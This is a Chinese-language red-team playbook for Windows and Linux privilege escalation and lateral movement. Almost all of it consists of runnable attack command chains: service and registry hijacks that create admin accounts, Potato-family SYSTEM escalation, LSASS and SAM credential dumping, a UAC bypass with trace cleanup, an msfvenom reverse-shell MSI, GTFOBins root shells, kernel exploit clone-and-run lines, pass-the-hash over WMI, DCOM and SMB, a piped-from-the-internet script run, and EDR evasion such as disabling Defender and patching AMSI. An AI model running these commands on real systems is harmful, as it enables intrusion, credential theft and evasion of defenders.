---
name: kb-priv-esc-lateral-deep
description: Windows/Linux 提权与横向移动专题纵深手册——服务权限/Potato家族/UAC绕过/凭据提取/内核CVE汇总/SUID/sudo-GTFOBins/capabilities/WMI/DCOM/SMB三通道/EDR对抗。比概览手册深一层，命令全部可运行，附判定门槛与2024-2026最新情报。
tags: [提权, 横向移动, Windows, Linux, Potato家族, UAC, 内核CVE, GTFOBins, DCOM, WMI, EDR对抗]
date: 2026-08-14
---

# Windows/Linux 提权与横向移动深度手册

> 概览手册（`kb_intranet_lateral_domain_2026.md`）讲拓扑/域攻击链；本文是它的纵深补层，只讲**提权与横移执行通道**。每个攻击给前置条件+完整命令链+判定门槛。已核对 2024-2026 最新情报（GodPotato/CoercedPotato、CVE-2024-1086/CVE-2024-50264、CVE-2025-33073 NTLM反射等），Sources 见文末。

## 〇、判定门槛总纲（先读这个）

| 你手上有什么 | 先试什么 | 判定信号 |
|---|---|---|
| Windows 低权 shell | `whoami /priv` → 有 SeImpersonate→Potato；无→服务权限/注册表/计划任务 | `nt authority\system` |
| Windows 服务账户(IIS/MSSQL/NETWORK SERVICE) | 必看 SeImpersonate/SeAssignPrimaryToken→Potato 家族 | SYSTEM |
| Windows 管理员(非高完整性) | UAC bypass（fodhelper/cmstp）→高完整性 | 无弹窗提权成功 |
| Windows 管理员(高完整性) | 直接抓凭据 LSASS/SAM/DPAPI → 横移 | 明文/NTLM/票据 |
| Linux 低权 shell | `sudo -l` → GTFOBins；`find / -perm -4000` → SUID；`getcap -r /` → capabilities | root |
| 已有一组域内凭据/哈希 | NetExec 批量验证 → 选执行通道（WinRM/WMI/SMB） | `Pwn3d!` 信号 |

**铁律**：①每参数最多 3 轮，不恋战；②枚举工具先跑一遍再手测（winPEAS/linPEAS 一次性覆盖）；③确认执行成功再上报，禁止"疑似"定性。

---

## 一、Windows 本地提权全谱

### 1.1 服务权限（最高频，先打这个）

**① 可写 binPath（替换服务二进制/SERVICE_CHANGE_CONFIG）**
```powershell
# 前置：服务配置可写（winPEAS/PowerUp 直接标红）
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Get-ModifiableService | fl *"   # 枚举
sc.exe qc <服务名>        # 查当前 binPath
sc.exe config <服务名> binPath= "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
sc.exe start <服务名>    # [SC] ChangeServiceConfig 成功 + 能 start = 命中
```

**② Unquoted Service Path（带空格且无引号的服务路径）**
```powershell
# 前置：路径形如 C:\Program Files\My App\srv.exe（无引号）+ 中间目录可写
wmic service get name,pathname | findstr /i /v "C:\Windows" | findstr /i /v """   # 找无引号路径
copy evil.exe "C:\Program Files\Program.exe"     # 放截断到空格前的名字 → 重启服务
sc.exe stop <服务名> & sc.exe start <服务名>
# 坑：服务没权限停/重启 → icacls 检查目录写权限；改注册表路径更稳（见③）
```

**③ 服务注册表权限（ImagePath 键可写）**
```powershell
# 前置：HKLM\SYSTEM\CurrentControlSet\Services\<服务名>\ImagePath 键可写（reg.exe 报拒绝=不行）
reg query HKLM\SYSTEM\CurrentControlSet\Services\<服务名> /v ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\<服务名> /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\evil.exe" /f
sc.exe start <服务名>
# 2025 新变体：Set-Service 改 SDDL 隐藏服务（EDR 看不到 sc/Get-Service）
Set-Service <服务名> -SecurityDescriptorSddl "D:(D;;DCLCRPDT;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
```

**判定门槛**：无 SeImpersonate 时服务权限是**第一优先级**；winPEAS 输出 `Modifiable Services` 段直接给命中行。

### 1.2 AlwaysInstallElevated / 计划任务 / 启动项

**① AlwaysInstallElevated（MSI 以 SYSTEM 静默安装）**
```powershell
# 前置：用户级+机器级两个键都为 1（多数机器没有，命中率低但一击必中）
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi   # 攻击机生成
msiexec /quiet /qn /i evil.msi
# 坑：MSI 写系统日志 EDR 高关注；MSI Wrapper 把任意 exe 打包成 MSI 更通用
```

**② 计划任务（弱权限任务 / 任务目录可写）**
```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"     # 找 SYSTEM 高权任务
# 替换任务指向的脚本/exe 等待触发；或直接建任务：
schtasks /create /tn evil /tr "cmd.exe /c net user h P@ss /add && net localgroup admins h /add" /sc once /st 00:00 /ru SYSTEM /f
schtasks /run /tn evil
# 工具：schtaskabuse 自动找可写任务并替换
```

**③ 启动项 / Run 注册表（需等重启，常用于持久化而非即时提权）**
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\temp\evil.exe" /f
# 坑：HKLM Run 多数用户无写权限；HKCU 同用户提不了权，即时提权场景少用
```

### 1.3 令牌利用：Potato 家族（服务账户标配）

**原理一句话**：`SeImpersonatePrivilege`（或 SeAssignPrimaryTokenPrivilege）允许进程"冒充"任何它持有令牌的客户端 → 诱导一个 SYSTEM 进程（DCOM/打印服务/EFS）以系统身份向本机回连 → 拿到 SYSTEM 令牌 → 派生高权进程。

```powershell
# 前置判定（服务账户必有，普通管理员用户没有）：
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
# 若输出为 Disabled 但存在 → 先 FullPowers 恢复默认令牌
FullPowers.exe
```

**家族对比（2024-2026 现状）**：

| 工具 | 原理/通道 | 版本限制 | 状态 |
|---|---|---|---|
| JuicyPotato | DCOM 反射 (CLSID 手工) | Server 2019/Win10 1809+ **已失效** | 淘汰 |
| PrintSpoofer | 打印假脱机服务 | 需 Spooler 开着（PrintNightmare 后常被关） | 可用但受限 |
| RoguePotato | 假 OXID 解析器 | 需出网 135，egress 被堵要 socat 转发 | 可用 |
| **GodPotato** | hook DCOM 激活 RPC 派发表(combase.dll) | Win8-11/Server2012-2022 全通 | **2024-2026 首选** |
| **EfsPotato/SharpEfsPotato** | MS-EFSR EfsRpcEncryptFileSrv | 备选通道多(lsarpc/efsrpc/samr) | 首选备份 |
| CoercedPotato | 新 RPC 强制认证+打印 | Server 2022 也通 | 2024 新 |
| SigmaPotato | GodPotato fork + 内存反射加载 | 同 GodPotato | 2024 新，EDR 更稳 |
| DeadPotato | GodPotato 重打包带后渗透模块 | 同 GodPotato | 检测风险高 |

**GodPotato 实战命令链**：
```bash
# 目标本机（Windows shell）：
GodPotato.exe -cmd "cmd /c whoami"                    # 直接验证 → nt authority\system
GodPotato.exe -cmd "cmd /c net user h P@ssw0rd /add && net localgroup administrators h /add"
# .NET 版本不匹配报错 → 换 GodPotato-NET2/35/4.exe 对应目标 .NET 版本
```

**EfsPotato 备选**：
```bash
EfsPotato.exe "cmd /c whoami > C:\temp\w.log"          # 输出写文件避免编码问题
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami"
# 报 0x6d3（RPC 认证服务不支持）→ 换 pipe：-pipe lsarpc / efsrpc / samr / lsass / netlogon
```

**坑与绕过**：
- 打出的 shell 是 SYSTEM 但 **cwd 可能无读权限**，先 `cd C:\`。
- PrintSpoofer 依赖 Spooler，禁用时优先 GodPotato/EfsPotato；RoguePotato 出网被堵 → socat 转发 135。
- 原版二进制被 EDR 拉黑 → **源码重编译** + 改字符串（GodPotato 是 C# 单文件易重编译）。
- **判定门槛**：`whoami` 返回 SYSTEM = 命中；Potato 全失败 → 检查 FullPowers 没跑/目标 .NET 版本。

### 1.4 凭据提取（SAM / LSA / DPAPI / Wifi / 浏览器）

```powershell
# ① SAM/LSA 离线（需 SYSTEM 或 SeDebugPrivilege）：
mimikatz "privilege::debug" "lsadump::sam" "lsadump::lsa /patch" exit
# ② LSASS 内存（EDR 在时先 dump 再离线解）：
procdump64.exe -accepteula -ma lsass.exe lsass.dmp          # 改名放非标准路径更稳
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> lsass.dmp full
pypykatz lsa minidump lsass.dmp                              # 攻击机离线解（Linux 也行）
mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
# ③ DPAPI（解 chrome/凭据管理器/IE）：mimikatz "dpapi::cred /in:<file>" exit；或一键 DonPAPI
# ④ Wifi 密码（无需高权）：
netsh wlan show profiles & netsh wlan show profile name=<SSID> key=clear
# ⑤ 浏览器密码：laZagne.exe browsers
```

**PPL/LSA Protection 对抗（Win11 默认开）**：
```powershell
# 有管理员但直接打开 LSASS 被拦 → 三选一：
#   a. mimikatz 驱动去 PPL: mimikatz "!+" "!processprotect /process:lsass.exe /remove"
#   b. 2025 实战：WerFaultSecure.exe（Win8.1 遗留，以 WinTCB PPL 跑在 24H2）触发 /h /pid /file 出未加密 dump
#   c. 不在本机抓：换域控或另一台高权机 DCSync（见概览手册 §5.6）
```

### 1.5 UAC Bypass（管理员用户 → 高完整性，无弹窗）

**前提**：当前用户在 Administrators 组但进程是 Medium 完整性。**不是漏洞**，是滥用 auto-elevate 白名单二进制 + 注册表劫持。

```powershell
# ① fodhelper.exe（2024-2026 最稳，Win10/11 大部分版本可用）
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe /c whoami > C:\temp\uac.txt" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
# 清理痕迹：
reg delete "HKCU\Software\Classes\ms-settings" /f
# ② cmstp.exe（BQTLOCK 勒索 2024 实战用过）
#    写 INF 里 RunPreSetupCommands 指向 payload，再 cmstp /s evil.inf 静默安装
# ③ computerdefaults.exe（fodhelper 被拦时的备份，同一 ms-settings 键）
# ④ UACME 全家桶（akagi64.exe，几十个方法枚举，很多已修但版本相关）
```

**坑**：eventvwr.exe 经典手法 **2018 后已修**（Win10 1803+ 不行）；sdclt 同理。2024-2025 的演进是**对已知手法的免杀化**（混淆+清理注册表），不是新原语。EDR 现在盯 `ms-settings\Shell\Open\command` 写注册表 → 写完立即删、延迟启动、用 `DelegateExecute` 空值 + 默认值打配合可降低命中。

### 1.6 Windows 内核提权 CVE 汇总表（2023-2025）

| CVE | 组件/成因 | 影响版本 | 野利用 | PoC |
|---|---|---|---|---|
| CVE-2024-21338 | appid.sys(AppLocker) 任意指针解引用→内核读写 | Win10/11 | Lazarus FudModule | 公开 |
| CVE-2024-26218 | win32k 内核提权 | Win11 22H2 等 | 野利用(BYOVD 链) | 公开 |
| CVE-2024-30088 | 内核 TOCTOU 竞争 | Win11 | Lazarus | 公开 |
| CVE-2024-38106 | Windows 内核提权 (CVSS 7.0) | 多版本 | 野利用 | 已补 |
| **CVE-2024-38193** | **afd.sys(AFD.sys) UAF** (CVSS 7.8) | Win10/11 | Lazarus，社工安装的驱动触发 | 公开 |
| CVE-2025-21345 | win32k 提权 | Win11 22H2/23H2 | 野利用(2025-02 补丁日) | 半公开 |
| CVE-2025-21224 | WNF(Windows Notification Facility) 堆溢出 | Win10/11 | Lazarus(2025-04) | 未公开 |
| CVE-2023-28252 | CLFS 日志文件提权 | Win10/11/Server | 野利用 | 公开 |
| CVE-2023-36802 | MSKSSRV.SYS 流服务代理 | 多版本 | 野利用 | 公开 |

**实战结论**：内核洞**永远不是第一选择**（版本精确匹配、不稳定、EDR 高感）。判定门槛：`systeminfo` + `wmic qfe list brief` 对补丁 → 只有**未打补丁且 PoC 匹配架构**才试；`windows-exploit-suggester` / winpeas 的 `kernel exploits` 段自动对。多数 SRC 实战走服务权限/Potato 就够了。

### 1.7 DLL 劫持与 spoolsv

```powershell
# DLL 劫持：前置=某高权进程从可写目录加载 DLL（服务目录可写但 binPath 不可改）
#   winPEAS 的 DLL Hijacking 段列候选 → msfvenom 生成 dll → 放对应目录 → 触发进程
# spoolsv 相关（PrintNightmare 已补，仅剩价值）：
#   - PrinterBug 只留"强制认证" → 喂 NTLM relay
#   - Print Spooler 开且未打补丁(极罕见)：MS-RPRN 任意 DLL 加载 → SYSTEM
```

---

## 二、Linux 提权全谱

### 2.1 SUID 利用表

```bash
# 枚举（标准三连）：
find / -perm -4000 -type f 2>/dev/null          # setuid root 文件
find / -perm -2000 -type f 2>/dev/null          # setgid
ls -la /usr/bin/passwd /usr/bin/sudo /usr/bin/su  # 确认哪些"正常"
# 命中"非常规 SUID 二进制" → 查 GTFOBins 对应利用（典型）：
```

| SUID 二进制 | 利用命令 |
|---|---|
| `python/python3` | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `perl` | `perl -e 'use POSIX; setuid(0); exec "/bin/sh"'` |
| `nmap`(老版) | `nmap --interactive` → `!sh` |
| `find` | `find / -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':py import os; os.setuid(0); os.system("/bin/sh")'` |
| `less/more` | 打开任意文件后 `!/bin/sh` |
| `env` | `env /bin/sh -p` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `cp` (GTFOBins 需配合写 /etc/passwd) | `cp /etc/passwd /tmp/p; echo 'hacker::0:0::/root:/bin/bash' >> /tmp/p; cp /tmp/p /etc/passwd` |

**判定门槛**：`find / -perm -4000` 出的**非标准**列表（/usr/bin/python、/usr/bin/perl、/usr/bin/nmap 等出现在 SUID 位 = 极高危）。标准 SUID（passwd/sudo/su）不要浪费时间。

### 2.2 sudo -l 场景利用表（GTFOBins 核心）

```bash
sudo -l    # 永远第一步；关注 NOPASSWD 行和 (ALL) 的二进制
```

| sudo 条目 | 利用命令 |
|---|---|
| `python/python3` | `sudo python -c 'import pty; pty.spawn("/bin/bash")'` |
| `perl` | `sudo perl -e 'exec "/bin/sh"'` |
| `nmap`(新) | `TF=$(mktemp); echo 'os.execute("/bin/bash")' > $TF; sudo nmap --script=$TF` |
| `find` | `sudo find . -exec /bin/bash \;` |
| `vim` | `sudo vim -c ':!bash'` |
| `less/more/man` | 打开后 `!bash` |
| `env` | `sudo env /bin/bash` |
| `awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `tee` | `echo 'hacker::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd` |
| `LD_PRELOAD` (env_keep 含它) | 编译 preload.c 里 `__attribute__((constructor))` 弹 shell → `sudo LD_PRELOAD=/tmp/p.so <任意sudo可执行>` |

```bash
# LD_PRELOAD PoC（前置：sudo -l 里 env_keep+=LD_PRELOAD 且能 sudo 任意程序）：
cat > /tmp/p.c <<'EOF'
#include <stdlib.h>
__attribute__((constructor)) void r(){ setuid(0); setgid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/p.so /tmp/p.c -nostartfiles
sudo LD_PRELOAD=/tmp/p.so <sudo -l 里允许的程序>
```

**判定门槛**：`sudo -l` 出非白名单二进制 + `(root) NOPASSWD` = 直接打；只出 `(ALL) ALL`（要密码）就看 sudo 版本漏洞/弱口令。

### 2.3 capabilities / PATH 劫持

```bash
# capabilities：getcap 扫描（高权 cap 挂着普通二进制 = 白送）
getcap -r / 2>/dev/null
#   cap_setuid + python:
#     /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
#   cap_dac_read_search + tar（读任意文件如 /etc/shadow）:
#     /usr/bin/tar -cvf key.tar /root/.ssh/id_rsa && tar -xvf key.tar
#   cap_dac_override + vim（写任意文件）:
#     vim /etc/passwd   # 改掉 root 密码哈希或加行

# PATH 劫持：前置=当前目录(.)在 PATH 最前 或 脚本调用未加绝对路径的命令
echo $PATH | grep -E '^\.:|:\.'
#   构造同名假命令：
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > <假命令名>
chmod +x <假命令名>
#   等 root 执行对应脚本（cron/手动）→ /tmp/rootbash -p 即 root
# 判定门槛：脚本型（shell/python）带 sudo/cron 执行 + 引用的命令没写绝对路径 = 命中
```

### 2.4 Linux 内核 CVE（2023-2026 实战可用）

| CVE | 组件/成因 | 影响版本 | PoC 状态 |
|---|---|---|---|
| **CVE-2021-4034 (PwnKit)** | polkit `pkexec` 环境变量数组越界 | 几乎所有发行版 | 一键稳定，**先试这个** |
| CVE-2022-0847 (DirtyPipe) | pipe 缓冲区 `CAN_MERGE` 未初始化 | 5.8-5.16.11/5.15.25/5.10.102 | 公开，写只读文件 |
| CVE-2023-2640/32629 (GameOverlay) | Ubuntu overlayfs 上提权 | Ubuntu 20.04/22.04 内核 6.2 以下 | 公开，仅 Ubuntu |
| **CVE-2024-1086** | nf_tables `nft_verdict_init` double-free | v5.14-v6.6 (排除 5.15.149+/6.1.76+/6.6.15+) | **Notselwyn 99.4%** |
| CVE-2024-50264 | AF_VSOCK UAF | 内核 4.8+ | Pwnie 2025 最佳提权，`kernel-hack-drill` 环境 |
| CVE-2023-0386 | overlayfs 权限穿越 | 部分发行版 | 公开 |

```bash
# PwnKit 一键（低权直接 root，PoC 遍地，优先）：
git clone https://github.com/ly4k/PwnKit
gcc -o PwnKit PwnKit.c && ./PwnKit
# CVE-2024-1086 一键（成功率高但会触发内核 panic 副作用）：
git clone https://github.com/Notselwyn/CVE-2024-1086 && cd CVE-2024-1086 && make && ./exploit
# 前置检查：cat /proc/sys/kernel/unprivileged_userns_clone 需=1；uname -a 版本需在范围
```

**坑**：①内核洞会崩机/留痕迹，先确认 `uname -a` 版本**在 PoC 影响范围内**再跑；②CVE-2024-1086 不适用 `CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y`（Ubuntu v6.5+）；③有 sudo -l 可打就不碰内核。

### 2.5 NFS / CRON / docker 组 / 可写文件

```bash
# ① NFS no_root_squash（前置：/etc/exports 配 no_root_squash 且你有挂载点）
showmount -e <target>                                   # 看导出
mkdir /tmp/nfs && mount -t nfs <target>:<导出> /tmp/nfs
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /tmp/nfs/x.sh && chmod +x /tmp/nfs/x.sh
# 等 root 执行 → /bin/bash -p
# ② CRON（root cron 脚本可写 / /etc/cron.d 可写 / cron PATH 可写目录前置）：
cat /etc/crontab && ls -la /var/spool/cron/crontabs/
#   可写脚本 → 注入 reverse shell；PATH 劫持 → 放同名命令
# ③ docker 组（id 在 docker 组 = 等价 root）：
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# ④ 其他：/etc/passwd 可写、/etc/ld.so.preload 可写（任意进程启动加载恶意 so → 全提权）
```

---

## 三、横向移动执行通道（协议细节）

前置：已有目标机**本地管理员**口令/哈希（域内或本地）。NetExec 批量验证先行：
```bash
nxc smb <ip> -u user -p pass -x 'whoami'          # 默认 smbexec；-M 换通道
nxc smb <ip> -u user -H <NTLM> --local-auth        # Pwn3d! 信号 = 本地管理员
```

### 3.1 WMI（T1047，隐蔽且不落盘）

**协议细节**：WMI 走 RPC → 经 TCP 135 端点映射器 → 协商动态高位端口(49152-65535)。**依赖 SMB 445**（回传输出用 ADMIN$），`-nooutput` 可去 SMB 只留 RPC。不创建服务、不写 7045 事件，隐蔽性高于 psexec。

```bash
# impacket 版（Linux 攻击机，PTH 通吃）：
impacket-wmiexec -hashes :<NTLM> 'corp/user@10.10.10.5'
impacket-wmiexec 'corp/user:Pass@10.10.10.5' -nooutput   # 更隐蔽，无 SMB 输出通道
# 原生 wmic（目标机本地或已控机）：
wmic /node:<target> /user:corp\user /password:Pass process call create "cmd.exe /c whoami > C:\temp\o.txt"
# 报错 0x800706ba → 目标防火墙拦了 DCOM/RPC 动态端口 → 换 SMB 通道
```

### 3.2 DCOM（T1021.003，最隐蔽文件less执行）

**协议细节**：DCOM 也走 RPC/135 + 动态高位端口。区别在**不使用 SMB 共享回传**（命令输出经 DCOM 通道返回），全程不写文件不建服务。**认证强制**（NTLM/Kerberos），有本地管理员凭据即可。

```bash
# impacket 版：
impacket-dcomexec -hashes :<NTLM> 'corp/user@10.10.10.5'
impacket-dcomexec -object MMC20 'corp/user:Pass@10.10.10.5'
# PowerShell 手工（等价 MMC20.Application）：
$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<target>"))
$c.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\o.txt","7")
# 备选 COM 对象：
#   ShellWindows / ShellBrowserWindow：需目标有交互式 Explorer（杀软/EDR 更易注意到）
#   Excel.Application：DDE 通道，需目标装了 Excel
```

**坑**：DCOM 被防火墙拦典型报 `0x800706ba` → 换 WMI 或 SMB；MMC20 最稳因为跑在 Session 0 无桌面依赖。

### 3.3 SMB 三件套对比（psexec / smbexec / atexec）

| 工具 | 机制 | 事件痕迹 | 隐蔽性 |
|---|---|---|---|
| psexec | 写服务到 admin$ 并启动，输出走命名管道 | **Event 7045 服务创建** + 服务名 | 最低，高感 |
| smbexec | 半交互，写临时 bat 到 admin$ 执行 | 7045 + 共享访问日志 | 中 |
| atexec | 计划任务（AT 任务） | 计划任务日志 | 中上 |
| wmiexec/dcomexec | RPC/DCOM 无服务 | WMI/DCOM 日志 | 最高 |

```bash
# 用法（impacket 全家桶，密码/哈希均可）：
impacket-psexec -hashes :<NTLM> 'corp/admin@10.10.10.5'
impacket-smbexec 'corp/user:Pass@10.10.10.5'
impacket-atexec 'corp/user:Pass@10.10.10.5' 'whoami'   # 单条命令，无需交互
# psexec 报"服务创建失败"但能连 445 → 换 smbexec/atexec（SCM 被限制时）
```

### 3.4 计划任务远程 / WinRM / SSH 私钥复用

```bash
# ① WinRM（5985/5986，最像正常运维，首选）：
evil-winrm -i 10.10.10.5 -u corp\user -H <NTLM>
# ② 远程计划任务（atexec 同通道，SCM 被限时的替代）：
schtasks /create /s <target> /u corp\user /p Pass /tn x /tr "cmd /c whoami > \\<target>\C$\temp\o.txt" /sc once /st 00:00 /f
schtasks /run /s <target> /tn x
# ③ SSH 私钥复用（Linux 横移）：
find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null          # 私钥
grep -R "password" /var/log /opt /home 2>/dev/null              # 脚本硬编码口令
#   .ssh/config 的 Host 别名 = 可信跳板清单，直接复用私钥横向
# ④ RDP PTH（需目标开 RestrictedAdmin）：xfreerdp3 /u:Administrator /v:<ip> /pth:<NTLM>
```

---

## 四、常见坑与 EDR 对抗

### 4.1 枚举工具速查（先枚举再动手）

```bash
# Windows：winPEAS（全量）→ Seatbelt（OPSEC 友好）→ SharpUp
winpeas.exe quiet servicesinfo > C:\Windows\Temp\wp.txt      # 只看服务
winpeas.exe > C:\Windows\Temp\winpeas.txt                    # 全量
.\Seatbelt.exe -group=all -full                              # 全部检查带 verbose
# Linux：linPEAS 内存加载
bash <(curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)
```

**判定门槛**：winPEAS 红/黄行直接决定下一步打什么（`Modifiable Services`/`AlwaysInstallElevated`/`SeImpersonate` 三者为 P0）。linPEAS 同理看 `/SUDO`,`/SUID`,`/Caps` 段。

### 4.2 EDR 对抗（2024-2026 现状）

```bash
# ① 落盘工具签名被拉黑 → 内存反射加载(.NET)/源码重编译改字符串/改名换目录
# ② PowerShell 深度监控 → 换 cmd/wscript/mshta 或 AMSI patch 后再跑
# ③ rundll32 白名单执行通道：
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('whoami')")
# ④ LSASS/PPL 对抗见 §1.4；⑤ 杀软实时扫描：Set-MpPreference -DisableRealtimeMonitoring $true
```

**2024-2026 现实**：签名检测已死，**行为检测**是主战场。别在目标机跑原版 mimikatz/GodPotato（行为签名秒杀），优先：工具重编译改字符串 / 内存加载 / 用同功能替代品（tWATa/ShadowToken 隐蔽令牌操作、SigmaPotato 替代 GodPotato）。

### 4.3 常见坑汇总

1. **SMB 签名强制**：relay/部分通道失效 → 换 LDAP/HTTP(ADCS ESC8) 目标；`ntlmrelayx -smb2support` 兜底。
2. **WinRM 关 / 5985 不通**：wmiexec(135) → dcomexec → smbexec → atexec 依次降级。
3. **纯工作组无域**：本地提权 + SAM 抓哈希 → 同口令/前缀口令横移（`nxc --local-auth` + `pass-pol` 看策略）。
4. **服务账户 Potato 打不出**：先 FullPowers 恢复默认令牌；换 GodPotato 的 .NET 版本；换 EfsPotato 的 pipe。
5. **内核洞误报/不稳**：必须 `uname -a` / `systeminfo` 对版本，KernelCTF 成功率≠实战成功率，崩机即暴露。
6. **票据时间敏感**：Kerberos 容差 5min，先 `w32tm /stripchart` 同步时钟。
7. **只读命令先验证执行**：`-x 'whoami'` / `cmd /c whoami` 确认通道通，再跑重量级操作。

---

## Sources（2024-2026 核对）

- tWATa 令牌操作/EDR 对抗 — https://trovent.io/en/windows-token-manipulation-with-twata/
- Potato 家族全解（RoguePotato/PrintSpoofer/SharpEfsPotato/GodPotato）— https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html
- GodPotato 实战与 AV 规避 — https://undercodetesting.com/unmasking-godpotato-a-deep-dive-into-av-evasion-and-privilege-escalation/
- SeImpersonate 利用全解 — https://oscp-notes-2025.gitbook.io/oscp+-notes-2025/privs-and-groups/seimpersonateprivilege-exploit.md
- CVE-2024-21338 appid.sys 分析 — https://www.safebreach.com/blog/cve-2024-21338-windows-kernel-privilege-escalation/
- CVE-2024-38193 afd.sys（CISA KEV）— https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- UAC bypass 各版本状态 — https://github.com/ExploitWorldDev/Windows-UAC-Bypass · UACME — https://github.com/hfiref0x/UACME
- PEASS-ng（winPEAS/linPEAS）— https://github.com/peass-ng/PEASS-ng · Seatbelt — https://github.com/GhostPack/Seatbelt
- GTFOBins — https://gtfobins.github.io/ · PwnKit — https://github.com/ly4k/PwnKit
- CVE-2024-1086 PoC（Notselwyn 99.4%）— https://github.com/Notselwyn/CVE-2024-1086
- CVE-2024-50264 vsock 分析（Pwnie 2025）— https://swarm.ptsecurity.com/kernel-hack-drill-and-a-new-approach-to-exploiting-cve-2024-50264-in-the-linux-kernel/
- WMI 横移原理 — https://red.infiltr8.io/redteam/pivoting/remote-wmi
- Impacket 五通道对比 — https://blog.csdn.net/2301_79518550/article/details/145849292 · DCOM 原理与防御 — https://blog.csdn.net/hnytgl/article/details/153107402
- NetExec 速查 — https://kalilinuxtutorials.com/netexec-cheatsheet/
